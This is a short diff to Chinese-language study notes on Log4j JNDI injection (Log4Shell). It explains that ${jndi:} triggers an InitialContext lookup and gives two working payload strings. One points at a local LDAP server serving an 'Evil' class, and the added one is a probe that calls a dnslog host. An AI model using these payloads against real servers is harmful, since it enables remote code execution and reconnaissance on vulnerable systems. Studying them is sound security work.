@@ -23,6 +23,11 @@ public static void main(String[] args) throws NamingException {
 ^
 ## **log4j的JNDI注入**
 ```
+使用${jndi:}后，底层使用了new InitialContext().lookup()
 logger.info("${jndi:ldap://127.0.0.1:1099/Evil}");
 ```
-使用${jndi:}后，底层使用了new InitialContext().lookup()。
+
+```
+仅测试dnslog即可
+logger.info("${jndi:ldap://xx.dnslog.cn}");
+```
